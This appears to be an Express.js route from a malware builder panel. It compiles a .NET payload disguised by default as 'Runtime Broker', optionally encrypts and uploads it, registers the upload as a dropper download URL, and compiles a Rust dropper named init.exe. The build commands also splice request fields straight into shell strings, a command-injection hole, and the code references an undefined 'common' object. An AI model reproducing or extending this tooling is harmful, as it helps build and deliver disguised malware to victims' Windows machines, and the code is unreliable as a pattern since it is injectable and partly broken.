import express from 'express';
import path from 'path';
import fs from 'fs';
import util from 'util';
import child from 'child_process';
import archiver from 'archiver';

import config from '../config.js';
import upload from '../utils/upload.js';
import crypto from '../utils/crypto.js';

import { UploadStatus } from '../enums.js';

const execute = util.promisify(child.exec);

const router = express.Router();

router.post('/start-build', async (req, res) => {
    console.log('building...');

    if (config.debug) {
        console.log('debug:', req.body);
    }

    const update = await fetch(config.domain + '/update-config', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(req.body)
    });

    if (!update.ok) {
        return res
            .status(500)
            .send('failed to update config');
    }

    const buildDir = path.resolve('../_build');
    if (!fs.existsSync(buildDir)) {
        fs.mkdirSync(buildDir);
    }

    for (const dir of fs.readdirSync(buildDir)) {
        if (!dir.startsWith('latest-')) {
            continue;
        }

        const oldPath = path.join(buildDir, dir);
        const newName = dir.replace('latest-', '');
        const newPath = path.join(buildDir, newName);
        fs.renameSync(oldPath, newPath);
    }

    const time = new Date()
        .toISOString()
        .replaceAll(':', '-')
        .replaceAll('.', '-');

    const outputDir = path.join(buildDir, `latest-${req.body.tag ?? 'default'}-${time}`);
    fs.mkdirSync(outputDir);

    let url = '';

    try {
        console.log('compiling main...');

        const ryuDir = path.resolve('../Main');
        const outDir = path.join(ryuDir, 'bin/Release/net8.0-windows10.0.17763.0/publish');

        if (req.body.clean_ryugyong_build) {
            await execute('dotnet clean', {
                cwd: ryuDir
            });
        }

        await execute(`dotnet publish -c Release --self-contained ${req.body.self_contain_ryugyong_build} -p:DebugType=none -p:DebugSymbols=false -p:AssemblyName="${req.body.custom_name || 'Runtime Broker'}"`, {
            cwd: ryuDir
        });

        let toUpload = undefined;

        const zipped = path.join(outputDir, 'publish.zip');
        await new Promise((resolve, reject) => {
            const output = fs.createWriteStream(zipped);
            const archive = archiver('zip', { zlib: { level: 9 } });

            output.on('close', resolve);
            archive.on('error', reject);

            archive.pipe(output);
            archive.directory(outDir, false);
            archive.finalize();
        });

        if (req.body.encrypt_ryugyong_file) {
            toUpload = await crypto.encryptFile(zipped);
            fs.unlinkSync(zipped);
        }

        if (req.body.custom_url.length > 0) {
            fs.unlinkSync(toUpload || zipped);
        }

        if (req.body.upload_ryugyong_file) {
            const uploaded = await upload.upload(toUpload || zipped);

            if (uploaded === UploadStatus.RequestNotOK) {
                return res
                    .status(500)
                    .send('failed to update config');
            }

            if (uploaded === UploadStatus.UnexpectedData) {
                return res
                    .status(500)
                    .send('failed to update config');
            }

            url = uploaded.uploaded;
            fs.unlinkSync(uploaded.newFile);
        }
    } catch(e) {
        console.error('failed to compile main -', e);

        return res
            .status(500)
            .send('failed to compile main');
    }

    console.log('built main successfully');

    if (url !== '') {
        const updateURL = await fetch(config.domain + '/update-config', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                only_dropper_url: true,
                download_url: url
            })
        });

        if (!updateURL.ok) {
            return res
                .status(500)
                .send('failed to update config');
        }
    }

    try {
        console.log('compiling dropper...');

        const main = path.resolve('../Dropper');
        const out = path.join(main, 'target/x86_64-pc-windows-msvc/release');

        await execute('cargo build --release --target x86_64-pc-windows-msvc', {
            cwd: main
        });

        fs.renameSync(
            path.join(out, 'rust-app.exe'),
            path.join(outputDir, 'init.exe')
        );
    } catch(e) {
        common.warn('failed to compile dropper -', e);

        return res
            .status(500)
            .send('failed to compile dropper');
    }

    console.log('built dropper successfully');

    console.log('build done');
    return res.sendStatus(200);
});

export default router;